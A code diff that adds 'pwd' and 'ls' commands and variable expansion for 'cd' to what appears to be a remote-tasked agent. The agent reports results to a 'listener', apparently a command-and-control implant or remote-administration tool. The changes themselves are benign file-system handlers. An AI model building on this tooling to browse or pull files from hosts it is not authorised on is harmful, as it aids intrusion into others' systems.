@@ -185,39 +185,52 @@ def cat_capability(task_id, arguments, connection):
             success=False,
             message=f"Unicode error reading file '{arguments['path']}': {str(exc)}",
         )
+        return
 
     connection.post_results_to_listener(task_id=task_id, success=True, message=content)
 
 
 def cd_capability(task_id, arguments, connection):
+    path = arguments["path"]
+    if arguments["expand"]:
+        path = os.path.expandvars(path)
+
     try:
-        os.chdir(arguments["path"])
+        os.chdir(path)
     except FileNotFoundError:
         connection.post_results_to_listener(
             task_id=task_id,
             success=False,
-            message=f"Directory not found: {arguments['path']}",
+            message=f"Directory not found: {path}",
         )
         return
     except NotADirectoryError:
         connection.post_results_to_listener(
             task_id=task_id,
             success=False,
-            message=f"Not a directory: {arguments['path']}",
+            message=f"Not a directory: {path}",
         )
         return
     except PermissionError:
         connection.post_results_to_listener(
             task_id=task_id,
             success=False,
-            message=f"Permission denied: {arguments['path']}",
+            message=f"Permission denied: {path}",
         )
         return
 
     connection.post_results_to_listener(
         task_id=task_id,
         success=True,
-        message=f"Changed directory to: {arguments['path']}",
+        message=f"Changed directory to: {path}",
+    )
+
+
+def pwd_capability(task_id, arguments, connection):
+    connection.post_results_to_listener(
+        task_id=task_id,
+        success=True,
+        message=os.getcwd(),
     )
 
 
@@ -333,6 +346,46 @@ def download_capability(task_id, arguments, connection):
         task_id=task_id,
         success=True,
         data={"type": "end_of_transfer"},
+    )
+
+
+def ls_capability(task_id, arguments, connection):
+    path = arguments["path"]
+    expand = arguments["expand"]
+
+    if expand:
+        path = os.path.expandvars(path)
+
+    if not os.path.exists(path):
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Failed to list directory. Path '{path}' does not exist.",
+        )
+        return
+
+    if not os.path.isdir(path):
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Failed to list directory. Path '{path}' is not a directory.",
+        )
+        return
+
+    try:
+        entries = os.listdir(path)
+    except PermissionError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Permission denied listing directory '{path}'.",
+        )
+        return
+
+    connection.post_results_to_listener(
+        task_id=task_id,
+        success=True,
+        message=f"Contents of directory '{path}': {entries}",
     )
 
 
@@ -732,6 +785,18 @@ class Agent:
                             )
                         elif command == "cd":
                             cd_capability(
+                                task_id=task_id,
+                                arguments=arguments,
+                                connection=self.connection,
+                            )
+                        elif command == "pwd":
+                            pwd_capability(
+                                task_id=task_id,
+                                arguments=arguments,
+                                connection=self.connection,
+                            )
+                        elif command == "ls":
+                            ls_capability(
                                 task_id=task_id,
                                 arguments=arguments,
                                 connection=self.connection,
